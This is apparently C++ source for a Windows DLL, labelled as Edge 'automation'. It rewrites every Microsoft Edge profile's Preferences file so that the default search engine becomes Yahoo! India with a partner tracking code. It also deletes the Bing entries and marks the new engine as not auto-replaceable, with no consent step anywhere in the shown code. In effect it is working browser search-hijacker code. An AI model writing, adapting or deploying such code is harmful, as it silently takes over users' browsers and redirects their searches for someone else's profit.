#include "pch.h"
#include "EdgeAutomationDLL.h"

#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>

#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <filesystem>

#include "json.hpp"
using json = nlohmann::json;

namespace fs = std::filesystem;

static std::wstring GetLocalAppData()
{
    PWSTR path = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData,
                                        KF_FLAG_DEFAULT,
                                        nullptr,
                                        &path)))
    {
        std::wstring result(path);
        CoTaskMemFree(path);
        return result;
    }
    return {};
}

static bool IsEdgeRunning()
{
    bool running = false;
    HANDLE snap = CreateToolhelp32Snapshot(
                    TH32CS_SNAPPROCESS, 0);

    if (snap == INVALID_HANDLE_VALUE)
        return false;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do {
            if (_wcsicmp(pe.szExeFile, L"msedge.exe") == 0)
            {
                running = true;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return running;
}

static std::vector<fs::path> FindPreferenceFiles(
    const std::wstring& localAppData)
{
    std::vector<fs::path> files;

    fs::path userDataDir =
        fs::path(localAppData) /
        L"Microsoft" / L"Edge" / L"User Data";

    if (!fs::exists(userDataDir))
        return files;

    std::vector<std::wstring> priorityProfiles = {
        L"Default",
        L"Profile 1"
    };

    for (const auto& profName : priorityProfiles)
    {
        fs::path prefs = userDataDir / profName / L"Preferences";
        if (fs::exists(prefs))
            files.push_back(prefs);
    }

    for (const auto& entry :
         fs::directory_iterator(userDataDir))
    {
        if (!entry.is_directory()) continue;

        std::wstring profName = entry.path().filename();
        if (profName == L"Default" || profName == L"Profile 1")
            continue;  

        fs::path prefs = entry.path() / L"Preferences";
        if (fs::exists(prefs))
            files.push_back(prefs);
    }

    return files;
}

static bool ReadFile(const fs::path& p, std::string& out)
{
    std::ifstream f(p, std::ios::binary);
    if (!f) return false;
    out.assign(std::istreambuf_iterator<char>(f),
               std::istreambuf_iterator<char>());
    return true;
}

static bool WriteFileAtomic(const fs::path& p,
                              const std::string& data)
{
    fs::path tmp = p;
    tmp += L".edgetmp";

    {
        std::ofstream f(tmp, std::ios::binary | std::ios::trunc);
        if (!f) return false;
        f << data;
        if (!f) return false;
    }

    std::error_code ec;
    fs::rename(tmp, p, ec);
    return !ec;
}

struct SearchEngineDescriptor
{
    const char* shortName;
    const char* keyword;
    const char* searchUrl;
    const char* suggestionsUrl;
    const char* faviconUrl;
    const char* newGuid;
};

static const SearchEngineDescriptor kTargetEngine = {
    "Yahoo! India",
    "in.yahoo.com",
    "https://in.search.yahoo.com/search"
    "?ei={inputEncoding}&fr=crmas"
    "&p={searchTerms}",
    "https://in.search.yahoo.com/sugg/chrome"
    "?output=fxjson&appid=crmas"
    "&command={searchTerms}",
    "https://in.search.yahoo.com/favicon.ico",
    "485bf7d3-0215-45af-87dc-538868000002"
};

static bool PatchPreferences(const fs::path& prefsPath)
{
    std::string raw;
    if (!ReadFile(prefsPath, raw))
        return false;

    json prefs;
    try {
        prefs = json::parse(raw);
    }
    catch (...) {
        return false;
    }

    const SearchEngineDescriptor& eng = kTargetEngine;

    prefs["default_search_provider"]["guid"] = eng.newGuid;
    prefs["default_search_provider"]["reset_occurred"] = false;

    auto& tmpl =
        prefs["default_search_provider_data"]
             ["mirrored_template_url_data"];
   
    tmpl["short_name"]              = eng.shortName;
    tmpl["short_name_lang"]         = "en";
    tmpl["keyword"]                 = eng.keyword;
    tmpl["url"]                     = eng.searchUrl;
    tmpl["suggestions_url"]         = eng.suggestionsUrl;
    tmpl["favicon_url"]             = eng.faviconUrl;
    tmpl["synced_guid"]             = eng.newGuid;

    tmpl.erase("prepopulate_id");
    tmpl.erase("id");

    tmpl["safe_for_autoreplace"] = false;

    tmpl["is_active"] = 1;
    tmpl["created_from_play_api"] = false;

    if (!tmpl.contains("input_encodings"))
        tmpl["input_encodings"] = json::array({"UTF-8"});

    if (prefs.contains("search_engines") && prefs["search_engines"].is_array())
    {
        auto& engines = prefs["search_engines"];

        std::vector<size_t> indicesToRemove;
        for (size_t i = 0; i < engines.size(); ++i)
        {
            if (engines[i].is_object())
            {
                auto kw = engines[i].value("keyword", "");
                if (kw.find("bing") != std::string::npos ||
                    engines[i].value("short_name", "").find("Bing") != std::string::npos)
                {
                    indicesToRemove.push_back(i);
                }
            }
        }

        for (auto it = indicesToRemove.rbegin();
             it != indicesToRemove.rend(); ++it)
        {
            engines.erase(engines.begin() + *it);
        }

        bool yahooFound = false;
        for (const auto& e : engines)
        {
            if (e.is_object() &&
                e.value("guid", "") == eng.newGuid)
            {
                yahooFound = true;
                break;
            }
        }

        if (!yahooFound)
        {
            json yahooEntry = {
                {"guid", eng.newGuid},
                {"short_name", eng.shortName},
                {"keyword", eng.keyword},
                {"url", eng.searchUrl},
                {"suggestions_url", eng.suggestionsUrl},
                {"favicon_url", eng.faviconUrl},
                {"safe_for_autoreplace", false},
                {"is_active", 1}
            };
            engines.push_back(yahooEntry);
        }
    }
    std::string patched = prefs.dump(-1);

    return WriteFileAtomic(prefsPath, patched);
}

extern "C"
{

EDGE_API int RunAutomation()
{
    if (IsEdgeRunning())
        return static_cast<int>(
                   AutomationStatus::ErrEdgeStillRunning);

    std::wstring lad = GetLocalAppData();
    if (lad.empty())
        return static_cast<int>(
                   AutomationStatus::ErrNoLocalAppData);

    auto files = FindPreferenceFiles(lad);
    if (files.empty())
        return static_cast<int>(
                   AutomationStatus::ErrPrefsNotFound);

    bool anyOk = false;
    for (const auto& p : files)
    {
        if (PatchPreferences(p))
            anyOk = true;
    }

    return static_cast<int>(
        anyOk ? AutomationStatus::Success
              : AutomationStatus::ErrPrefsWriteFailed);
}

EDGE_API const char* StatusMessage(int code)
{
    switch (static_cast<AutomationStatus>(code))
    {
    case AutomationStatus::Success:
        return "Success";
    case AutomationStatus::ErrNoLocalAppData:
        return "Could not resolve %LOCALAPPDATA%";
    case AutomationStatus::ErrPrefsNotFound:
        return "No Edge Preferences file found";
    case AutomationStatus::ErrPrefsReadFailed:
        return "Failed to read Preferences file";
    case AutomationStatus::ErrJsonParseFailed:
        return "JSON parse error in Preferences";
    case AutomationStatus::ErrPrefsWriteFailed:
        return "Failed to write patched Preferences";
    case AutomationStatus::ErrEdgeStillRunning:
        return "Microsoft Edge is running – close it first";
    default:
        return "Unknown error";
    }
}

}
